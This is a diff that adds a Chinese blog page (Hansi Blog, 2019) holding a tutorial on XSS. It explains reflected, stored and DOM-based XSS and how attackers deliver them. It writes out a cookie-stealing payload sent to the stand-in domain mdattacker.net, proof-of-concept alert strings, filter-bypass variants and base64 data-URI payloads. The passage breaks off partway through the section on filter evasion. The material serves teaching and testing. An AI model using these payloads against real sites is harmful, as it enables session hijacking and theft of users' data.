@@ -1,0 +1,1378 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="Zh_cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="安全,Web,XSS攻击," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="XSS攻击跨站点脚本（XSS）是Web应用程序中发现的最为普遍的漏洞，困扰着现在绝大多数的应用程序，包括因特网上一些最为注重安全的应用程序。XSS漏洞表现为各种形式，并且可分为3种类型：反射型、保存型和基于DOM的XSS漏洞。虽然这些漏洞具有一些相同的特点，但在如何确定及利用这些漏洞方面，仍然存在一些重要的差异。 反射型XSS漏洞如果一个应用程序使用动态页面向用户显示错误消息，就会造成一种常见的X">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS攻击">
+<meta property="og:url" content="http://huhansi.com/2019/04/02/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/6-XSS%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="Hansi Blog">
+<meta property="og:description" content="XSS攻击跨站点脚本（XSS）是Web应用程序中发现的最为普遍的漏洞，困扰着现在绝大多数的应用程序，包括因特网上一些最为注重安全的应用程序。XSS漏洞表现为各种形式，并且可分为3种类型：反射型、保存型和基于DOM的XSS漏洞。虽然这些漏洞具有一些相同的特点，但在如何确定及利用这些漏洞方面，仍然存在一些重要的差异。 反射型XSS漏洞如果一个应用程序使用动态页面向用户显示错误消息，就会造成一种常见的X">
+<meta property="og:locale" content="Zh_CN">
+<meta property="article:published_time" content="2019-04-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-06-10T15:05:30.119Z">
+<meta property="article:author" content="Han si">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="XSS攻击">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://huhansi.com/2019/04/02/安全/Web安全/6-XSS攻击/"/>
+
+
+
+
+
+  <title>XSS攻击 | Hansi Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="Zh_cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hansi Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Know something of everything, know everything of something</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://huhansi.com/2019/04/02/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/6-XSS%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Han si">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hansi Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XSS攻击</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-02T00:00:00+08:00">
+                2019-04-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h1><p>跨站点脚本（XSS）是Web应用程序中发现的最为普遍的漏洞，困扰着现在绝大多数的应用程序，包括因特网上一些最为注重安全的应用程序。XSS漏洞表现为各种形式，并且可分为3种类型：反射型、保存型和基于DOM的XSS漏洞。虽然这些漏洞具有一些相同的特点，但在如何确定及利用这些漏洞方面，仍然存在一些重要的差异。</p>
+<h2 id="反射型XSS漏洞"><a href="#反射型XSS漏洞" class="headerlink" title="反射型XSS漏洞"></a>反射型XSS漏洞</h2><p>如果一个应用程序使用动态页面向用户显示错误消息，就会造成一种常见的XSS漏洞。通常，该页面会使用一个包含消息文本的参数，并在响应中将这个文本返回给用户。由于利用这种漏洞需要设计一个包含嵌入式JavaScript代码的请求，随后这些代码又被反射到任何提出请求的用户，因此它被称作反射型XSS。攻击有效载荷分别通过一个单独的请求与响应进行传送和执行。为此，有时它也被称为一阶XSS。</p>
+<h3 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h3><p>利用XSS漏洞攻击应用程序其他用户的方式有很多种。最简单的一种攻击，也是我们常用于说明XSS漏洞潜在影响的一种攻击，可导致攻击者接货通过验证的用户的会话令牌。劫持用户的会话后，攻击者就可以访问该用户经授权访问的所有数据和功能。</p>
+<p>实施这种攻击的步骤如图所示。</p>
+<ol>
+<li><p>用户正常登陆应用程序，得到一个包含会话令牌的cookie：</p>
+<p>Set-Cookie: sessid=23123djksdah2132489021213</p>
+</li>
+<li><p>攻击者通过某种方法向用户提交以下URL:</p>
+<p><a href="http://mdsec.net/error/5/Error.ashx?message=" target="_blank" rel="noopener">http://mdsec.net/error/5/Error.ashx?message=</a><script>var+i=new+Image;+i.src="<a href="http://mdattacker.net/&quot;%2bdocument.cookie" target="_blank" rel="noopener">http://mdattacker.net/&quot;%2bdocument.cookie</a>;</script></p>
+<p>和前面生成一个对话框消息的示例一样，这个URL包含嵌入式JavaScript的代码。但是这个示例中的攻击有效载荷更加恶毒</p>
+</li>
+<li><p>用户从应用程序中请求攻击者传送给他们的URL</p>
+</li>
+<li><p>服务器响应用户的请求。由于应用程序中存在XSS漏洞，响应中包含攻击者创建的JavaScript代码</p>
+</li>
+<li><p>用户浏览器收到攻击者的JavaScript代码，像执行从应用程序收到的其他代码一样，浏览器执行这段代码</p>
+</li>
+<li><p>攻击者创建的恶意JavaScript代码为：</p>
+<p>var i = new Image;i.src=”<a href="http://mdattacker.net/&quot;+document.cookie" target="_blank" rel="noopener">http://mdattacker.net/&quot;+document.cookie</a>;</p>
+<p>这段代码可让用户浏览器向mdattacker.net（攻击者拥有的一个域）提出一个请求。请求中包含用户访问应用程序的当前会话令牌：</p>
+<p>Get /sessId=23123djksdah2132489021213 HTTP/1.1</p>
+<p>Host:mdattacker.net</p>
+</li>
+<li><p>攻击者监控访问mdattacker.net的请求并收到用户的请求。攻击者使用截获的令牌劫持用户的会话，从而访问该用户的个人信息，并“代表”该用户执行任意操作。</p>
+</li>
+</ol>
+<h2 id="保存型XSS漏洞"><a href="#保存型XSS漏洞" class="headerlink" title="保存型XSS漏洞"></a>保存型XSS漏洞</h2><p>另一种常见的XSS漏洞叫做保存型跨站点脚本。如果一名用户提交的数据被保存在应用程序中（通常保存在一个后端数据库中），然后不经适当过滤或净化就显示给其他用户，此时就会出现这种漏洞。</p>
+<p>在支持中断用户交互的应用程序中，或者在具有管理权限的员工访问同一个应用程序中的用户记录和数据的应用程序中，保存型XSS漏洞很常见。</p>
+<p>一般情况下，利用保存型XSS漏洞的攻击至少需要向应用程序提出两个要求。攻击者在第一个请求中传送一些专门设计的数据，其中包含恶意代码，应用程序接受并保存这些数据。在第二个请求中，一名受害者查看某个包含攻击者的数据的页面，这时恶意代码开始执行。为此，这种漏洞有时也叫做二阶跨站点脚本。</p>
+<p>下图说明了一名攻击者如何利用保存型XSS漏洞，实施删除利用反射性XSS漏洞实施的相同会话劫持攻击。</p>
+<p>反射型与保存型XSS攻击在实施步骤上存在两个重要的区别，这也使得后者往往造成更大的安全威胁。</p>
+<p>首先，在反射型XSS脚本攻击中，要利用一个漏洞，攻击者必须以某种方式诱使受害者访问他专门设计的URL。而保存型XSS脚本攻击则没有这种要求。在应用程序中展开攻击后，攻击者只需要等待受害者浏览已被攻破的页面或功能。通常，这个页面是一个正常用户将会主动访问的常规页面。</p>
+<p>其次，如果受害者在遭受攻击时正在使用应用程序，攻击者就更容易实现其XSS漏洞的目的。例如，如果当前正在进行会话，那么攻击者就可以劫持这个会话。在反射型XSS攻击中，攻击者可能会说服用户登录，然后单击它们提供的一个链接，从而制造这种情况。或者他可能会部署一个永久性的有效载荷并等待用户登录。因为攻击有效载荷被保存在用户自主访问的一个应用程序页面中，所以，当有效载荷执行时，任何攻击受害者都在使用应用程序。而且，如果上述页面位于应用程序通过验证的区域内，那么攻击受害者一定已经登录。</p>
+<p>反射型与保存型XSS攻击之间的这些区别意味着保存型XSS漏洞往往会给应用程序带来更严重的安全威胁。许多时候，攻击者可以向应用程序提交一些专门设计的数据，然后等待受害者访问它们。如果其中一名受害者是管理员，那么攻击者就能够完全攻破整个应用程序。</p>
+<h2 id="基于DOM的XSS"><a href="#基于DOM的XSS" class="headerlink" title="基于DOM的XSS"></a>基于DOM的XSS</h2><p>反射型和保存型XSS漏洞都表现出一种特殊的行为模式，其中应用程序提取用户控制的数据并以危险的方式将这些数据返回给用户。第三类XSS漏洞并不具有这种特点。在这种漏洞中，攻击者的JavaScript通过以下过程得以执行。</p>
+<ul>
+<li>用户请求一个经过专门设计的URL，它由攻击者提交，且其中包含嵌入式JavaScript</li>
+<li>服务器的响应中并不一定任何形式包含攻击者的脚本</li>
+<li>当用户的浏览器处理这个响应时，上述脚本得以处理。</li>
+</ul>
+<p>由于客户端JavaScript可以访问浏览器的文本对象模型（Document Object Model， DOM），因此它能够决定用于加载当前页面的URL。由应用程序发布的一段脚本可以从URL中提取数据，对这些数据进行处理，然后用它动态更新页面的内容。如果这样，应用程序就可能易于受到基于DOM的XSS攻击。</p>
+<p>回到前面的反射型XSS漏洞中的示例，其中服务器端应用程序讲一个URL参数值复制到一条错误消息中。另一种事项相同功能的办法是由应用程序每次返回相同的静态HTML，并使用客户端JavaScript动态生成消息内容。</p>
+<p>例如，假设应用程序返回的错误页面包含以下脚本：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">var</span> url = <span class="built_in">document</span>.location;</span><br><span class="line">	url = <span class="built_in">unescape</span>(url);</span><br><span class="line">	<span class="keyword">var</span> message = url.substring(url.indexof(<span class="string">'message='</span>) + <span class="number">8</span>, url.length);</span><br><span class="line">	<span class="built_in">document</span>.write(message);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这段脚本解析URL，提取出message参数的值，并把这个值写入页面的HTML源代码中。如果按开发者预想的方式调用，它可以和前面的示例中一样，用于创建错误消息。但是，如果攻击者设计出一个URL，并以JavaScript代码作为message参数，那么这段代码将被动态写入页面中，并向服务器返回代码一样得以执行。在这个示例中，前面示例中利用反射型XSS漏洞的同一个URL也可用于生成一个对话框：</p>
+<p><a href="http://mdsec.net/error/18/Error.ashx?message=" target="_blank" rel="noopener">http://mdsec.net/error/18/Error.ashx?message=</a><script>alert('xss')</script></p>
+<p>利用基于DOM的XSS漏洞如下图所示</p>
+<p>与保存型XSS漏洞相比，基于DOM的XSS漏洞与反射型XSS漏洞有更大的相似性。利用它们通常需要攻击者诱使一名用户访问一个包含恶意代码的专门设计的URL，并由服务器响应那个确保恶意代码得以执行的特殊请求。</p>
+<h2 id="XSS攻击的传送机制"><a href="#XSS攻击的传送机制" class="headerlink" title="XSS攻击的传送机制"></a>XSS攻击的传送机制</h2><p>确定一个XSS漏洞并设计出利用它的有效载荷后，攻击者需要找出办法向应用程序的其他用户传送攻击。</p>
+<h3 id="传送反射型与基于DOM的XSS攻击"><a href="#传送反射型与基于DOM的XSS攻击" class="headerlink" title="传送反射型与基于DOM的XSS攻击"></a>传送反射型与基于DOM的XSS攻击</h3><p>除了通过电子邮件向随机用户发亮发送专门设计的URL这种明显的钓鱼向量外，攻击者还可以尝试使用以下机制传送反射型或基于DOM的XSS攻击。</p>
+<ul>
+<li><p>在由针对性的攻击者，攻击者可以向个体目标用户或少数几名用户发送一封伪造的电子邮件。如果攻击者想要攻破某个特殊用户的会话（而非截取随机用户的会话），实施合理、可靠的针对性攻击往往是最有效的传送机制。有时，我们会把这类攻击称为“鱼叉式钓鱼”。</p>
+</li>
+<li><p>可以在即时消息中项目表用户提供一个URL。</p>
+</li>
+<li><p>第三方Web站点上的内容与代码可用于生成触发XSS漏洞的请求。各种常见的应用程序允许用户发布数量有限的HTML标记，这些标记将按原样向其他用户显示。如果可以使用GET方法触发XSS漏洞，攻击者就可以在第三方站点上发布一个指向某恶意URL的IMG标签，任何查看以上第三方内容的用户将在不知情的情况下请求该恶意URL。</p>
+<p>或者，攻击者可以创建自己的Web站点，在其中包含诱使用户访问的有趣内容，但也可能含有一些脚本，导致用户的浏览器向易受攻击的应用程序提出包含XSS有效载荷的请求。如果某用户登录以上易受攻击的应用程序，并且碰巧浏览了攻击者的站点，该用户访问以上易受攻击的应用程序的会话将被攻破。</p>
+<p>建立适当的Web站点后，攻击者可以使用搜索引擎操纵技巧生成某些用户提交的访问，例如，将相关关键字放入站点内容中并使用相关表达式将其链接到相关站点。但是，这种传送机制与钓鱼攻击无关，因为攻击者的站点并未试图模仿它所针对的站点。</p>
+<p>注意，这种传送机制使得攻击者可利用只通过POST请求触发的反射型与基于dom的XSS漏洞。但是，利用这些漏洞，攻击者明显不能通过向受害用户发送一个简单的URL来传送依次攻击。然而，某个恶意Web站点可能包含一个HTML表单，它使用POST方法并以易受攻击的应用程序作为它的目标URL。其页面上的JavaScript或导航空间可用于提交表单，成功利用漏洞。</p>
+</li>
+<li><p>在另一种利用第三方Web站点的攻击中，一些攻击者付费购买许多链接至一个URL的横幅广告，该URL包含一个针对某易受攻击的应用程序的XSS有效载荷。</p>
+</li>
+<li><p>许多应用程序执行一种“推荐给朋友”或向站点管理员发送反馈的功能。</p>
+</li>
+</ul>
+<h3 id="传送保存型XSS攻击"><a href="#传送保存型XSS攻击" class="headerlink" title="传送保存型XSS攻击"></a>传送保存型XSS攻击</h3><p>保存型XSS攻击共有两种传送机制：带内与带外传送机制。</p>
+<p>带内传送机制适用于大多数情况，这时漏洞数据通过主Web界面提交给应用程序。用户控制的数据最终显示给其他用户的常见位置包含：</p>
+<ul>
+<li>个人信息字段，如姓名、地址、电子邮件、电话等；</li>
+<li>文档、上传文件及其他数据的名称；</li>
+<li>提交给应用程序管理员的反馈或问题；</li>
+<li>向其他应用程序用户传送的消息、注释、问题等；</li>
+<li>记录在应用程序日志中，并通过浏览器显示给管理员的任何内容，如URL、用户名、HTTP Referer、User-Agent等；</li>
+<li>在用户之间共享的上传文件内容。</li>
+</ul>
+<p>在这些情况下，只需向应用程序页面提交XSS有效载荷，然后等待受害者查看恶意代码，就可以传送XSS有效载荷。</p>
+<p>带外传送机制适用于通过其他渠道向应用程序提交漏洞数据情况。应用程序通过这种渠道接收数据，并最终在主Web界面生成的HTML页面中显示它。前面描述的针对Web邮件应用程序的攻击就是这种传送机制的典型示例。这种攻击像一个SMTP服务器传送恶意数据，并最终在一条HTML格式的电子邮件消息中向用户显示这些数据。</p>
+<h2 id="查找并利用XSS漏洞"><a href="#查找并利用XSS漏洞" class="headerlink" title="查找并利用XSS漏洞"></a>查找并利用XSS漏洞</h2><p>确定XSS漏洞的基本方法是使用下面这个概念验证攻击字符串：</p>
+<p><strong>&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</strong></p>
+<p>这个字符串被提交给每个应用程序页面的每一个参数；同时，攻击者监控它的响应，看其中是否出现相同的字符串。如果发现攻击字符串按原样出现在响应中，几乎可以肯定应用存在XSS漏洞。</p>
+<p>如果仅仅是为了尽可能地确定应用程序中存在某种XSS漏洞，以向其他应用程序用户实施攻击，那么这个基本方法可能使最为有效的方法，因为它可以实现高度自动化，而且很少生成错误警报。但是，如果是对应用程序进行复杂的测试，从而确定尽可能多的漏洞，那么在应用基本方法的同时，还需要组合使用更加复杂的技巧。在以下几种情况下，通过基本的检测方法可能无法确定应用程序中存在XSS漏洞。</p>
+<ul>
+<li><p>许多应用程序实施基于黑名单的初步过滤，试图阻止XSS攻击。通常，这些过滤在请求参数中寻找<script>之类的表达式，并采取一些防御措施，如删除或编码表达式，或者完全阻止这类请求。基本检测方法中常用的攻击字符串往往被这些过滤阻止。但是，仅仅因为一个常见的攻击字符串被阻止，并不能证明一个可利用的漏洞不存在。如后文所述，在有些情况下，不使用<script>标签，甚至不使用" < >和/这些常被过滤掉的字符，也可以利用XSS漏洞。</p>
+</li>
+<li><p>许多应用程序实施的防XSS过滤存在缺陷，可以通过各种方法避开。例如，假设在处理用户输入前，应用程序删除其中出现的所有<script>标签。这意味着基本方法中使用的攻击字符串将不会在应用程序的响应中返回。但是，以下一个或几个字符串可轻易避开过滤，成功利用XSS漏洞：</p>
+<p><strong>">&lt;script >alert(document.cookie)&lt;/script ></strong></p>
+<p><strong>">&lt;ScRiPt>alert(document.cookie)&lt;/ScRiPt></strong></p>
+<p><strong>"%3e%3cscript%3ealert(document.cookie)%3c/script%3e</strong></p>
+<p><strong>">&lt;scr&lt;script>ipt>alert(document.cookie)&lt;/scr&lt;script>ipt></strong></p>
+<p><strong>%00">&lt;script>alert(document.cookie)&lt;/script></strong></p>
+</li>
+</ul>
+<p>注意，在这些情况下，在服务器的响应中，输入的字符串返回前，可能经过净化、编码或其他形式的修改，因而还不足以实现对XSS漏洞的利用。这时，提交一个特殊字符串并检查它是否在服务器的响应中出现的基本检测方法将无法成功发现漏洞。</p>
+<p>当利用基于DOM的XSS漏洞时，攻击有效载荷并不在服务器的响应中返回，而是保存在浏览器DOM中，并可被客户端JavaScript访问。同样，在这种情况下，提交一个特殊字符串并检查它是否在服务器的响应中出现的基本检测方法将无法成功发现漏洞。</p>
+<h3 id="查找并利用反射型XSS漏洞"><a href="#查找并利用反射型XSS漏洞" class="headerlink" title="查找并利用反射型XSS漏洞"></a>查找并利用反射型XSS漏洞</h3><p>要探查反射型XSS漏洞，最可靠的方法是系统性地检查在解析应用程序过程中确定的所有用户输入进入点，并遵循以下步骤。</p>
+<ul>
+<li>在每个进入点提交的一个良性字母字符串</li>
+<li>确定此字符串“反射”在应用程序响应中的所有位置</li>
+<li>对于每个反射，确定显示反射型数据时的语法上下文</li>
+<li>提交针对反射的语法上下文而修改的数据，尝试在响应中引入任意脚本</li>
+<li>如果反射型数据被阻止或净化，导致脚本无法执行，则尝试了解并避开应用程序的防御性过滤</li>
+</ul>
+<h4 id="确认用户输入的反射"><a href="#确认用户输入的反射" class="headerlink" title="确认用户输入的反射"></a>确认用户输入的反射</h4><p>检测反射型XSS漏洞最可靠的方法的初始步骤与前面描述的方法类似。</p>
+<ol>
+<li><p>选择任意一个字符串，该字符串不曾出现在应用程序的任何地方，而且其中仅包含字母字符，因此不可能受到针对XSS过滤的影响。例如：</p>
+<p><strong>myxsstestdmqlwp</strong></p>
+<p>提交这个字符串，以其作为每个页面的每一个参数，且每次只针对一个参数。</p>
+</li>
+<li><p>监控应用程序的响应，看其中是否出现同一个字符串。记下参数值被复制到应用程序响应中的每一个参数。这些参数不一定容易受到攻击，但需要对它们进行深入分析。</p>
+</li>
+<li><p>注意，必须测试所有GET与POST请求，检查URL查询字符串与消息主体中的每一个参数。虽然有少数XSS漏洞传送机制只能通过一个POST请求触发，但仍有可能对漏洞加以利用。</p>
+</li>
+<li><p>任何时候，一旦在POST请求中发现XSS，应使用burp中的“更改请求方法”选项确定是否可以通过GET请求实施相同的攻击</p>
+</li>
+<li><p>除标准的请求参数外，还应该检测HTTP请求消息头内容被应用程序处理的每一种情况。有一种常见的XSS漏洞出现在错误消息中，这时Referer与User-Agent消息头之类的数据项被复制到消息的内容中。这些消息头是传送反射型XSS攻击的有效工具，因为攻击者可以使用一个Flash对象诱使受害者提出一个包含任意HTTP消息头的请求。</p>
+</li>
+</ol>
+<h4 id="测试引入脚本的反射"><a href="#测试引入脚本的反射" class="headerlink" title="测试引入脚本的反射"></a>测试引入脚本的反射</h4><p>必须手动检查已确定的每一个反射型输实例，已核实其是否可被利用。在响应中包含反射型数据的每个位置，都需要确认该数据的语法特点。这时，必须找到某种修改输入的方法，以便在将输入复制到应用程序响应中的相同位置时，任何脚本都能够得到以执行。下面分析这方面的一些示例。</p>
+<h5 id="例1：标签属性值"><a href="#例1：标签属性值" class="headerlink" title="例1：标签属性值"></a>例1：标签属性值</h5><p>假设返回的页面中包含以下脚本：</p>
+<p><strong>&lt;input type="text" name="address1" value="mysxxtestdmqlwp"></strong></p>
+<p>很明显，利用XSS的一种方法是终止包含字符串的双引号，结束&lt;input>标签，然后通过其他方法引入JavaScript脚本（使用&lt;script>等）。例如：</p>
+<p>** " onfocus="alert(1)**</p>
+<h5 id="例2：JavaScript字符串"><a href="#例2：JavaScript字符串" class="headerlink" title="例2：JavaScript字符串"></a>例2：JavaScript字符串</h5><p>假设返回的页面包含以下脚本：</p>
+<p><strong>&lt;script>var a = 'myxsstestdmqlwp';var b = 123;...&lt;/script></strong></p>
+<p>这时受控制的字符串被直接插入到现有的一段脚本中。要利用XSS，可以终止字符串周围的单引号，用一个分号终止整个语句，然后直接处理想要执行的JavaScript。例如：</p>
+<p><strong>'; alert(1); var foo='</strong></p>
+<p>注意，因为已经终止了一个被引用的字符串，为阻止JavaScript解释器出现错误，必须在注入的代码后使用有效的语法确保脚本继续正常执行。在这个示例中，变量foo被声明，另一个引用字符串被打开，它们将被紧随在字符串后面的代码终止。另一种经常有效的方法是使用//结束输入，将剩下的脚本当做注释处理。</p>
+<h5 id="例3：包含URL的特性"><a href="#例3：包含URL的特性" class="headerlink" title="例3：包含URL的特性"></a>例3：包含URL的特性</h5><p>假设返回的页面包含以下脚本：</p>
+<p><strong>&lt;a href='"myxsstestdmqlwp">Click hear ...&lt;/a></strong></p>
+<p>这时，受控制的字符串插入到一个&lt;a>标签的href属性中。在一些浏览器中，这个属性可能包含一个使用javascript:协议的URL，从而可以使用以下脚本直接利用XSS：</p>
+<p><strong>javascript:alert(1)</strong></p>
+<p>如前所述，因为输入将反射到标签属性中，因此这时还可以注入一个事件处理器。</p>
+<p>要向当前所有的浏览器实施攻击，可以同时使用一个无效的图像名称与一个onerror事件处理器：</p>
+<p><strong>#“onclick="javascript:alert(1)</strong></p>
+<p>对于在前面步骤中记下的每一个潜在的XSS漏洞，采取以下措施。</p>
+<ol>
+<li>检查HTML源代码，确定受控制的字符串的位置</li>
+<li>如果字符串出现在几个位置，应将每个位置当做一个潜在的漏洞，分别进行分析</li>
+<li>根据用户控制的字符串在HTML中的位置，确定需要如何对其进行修改以使任意JavaScript得以执行。通常，有大量方法可称为传送攻击的有效工具。</li>
+<li>向应用程序提交设计的字符串，测试它是否有用。如果涉及的字符串仍然按原样返回，表示应用程序存在XSS漏洞。使用一段概念验证脚本显示一个警报对话框，重复检查语法是否正确，并确定响应显示时，对话框是否出现在浏览器中。</li>
+</ol>
+<h4 id="探查防御性反射"><a href="#探查防御性反射" class="headerlink" title="探查防御性反射"></a>探查防御性反射</h4><p>通常情况下最初提交的攻击字符串并不会被服务器按原样返回，因而无法成功执行注入的JavaScript。如果是这样，不要放弃！接下来应该确定服务器对输入进行了哪些处理。主要有以下3中可能的情况。</p>
+<ul>
+<li>应用程序或者Web应用程序防火墙保护的应用程序发现一个攻击签名，完全阻止了输入。</li>
+<li>应用程序已经接受了输入，但对攻击字符串进行了某种净化或编码。</li>
+<li>应用程序把攻击字符串截短至某个固定的最大长度。</li>
+</ul>
+<h4 id="避开基于签名的过滤"><a href="#避开基于签名的过滤" class="headerlink" title="避开基于签名的过滤"></a>避开基于签名的过滤</h4><h5 id="引入脚本代码的方法"><a href="#引入脚本代码的方法" class="headerlink" title="引入脚本代码的方法"></a>引入脚本代码的方法</h5><p>有4中不同的方法可用于在HTML页面中引入脚本代码。</p>
+<h5 id="脚本标签"><a href="#脚本标签" class="headerlink" title="脚本标签"></a>脚本标签</h5><p>除直接使用&lt;script>标签外，还可以通过各种方法、使用复杂的语法来隐藏标签，从而避开某些过滤：</p>
+<p><strong>&lt;object data="data:text/html,&lt;script>alert(1)&lt;/script>"></strong></p>
+<p><strong>&lt;object data="data:text/html;base64,JTNDc2NyaXB0JTNFYWxlcnQlMjgxJTI5JTNDL3NjcmlwdCUzRQ=="></strong></p>
+<p><strong>&lt;object data="data:text/html;base64,JTNDc2NyaXB0JTNFYWxlcnQlMjgxJTI5JTNDL3NjcmlwdCUzRQ==">Click here&lt;/a></strong></p>
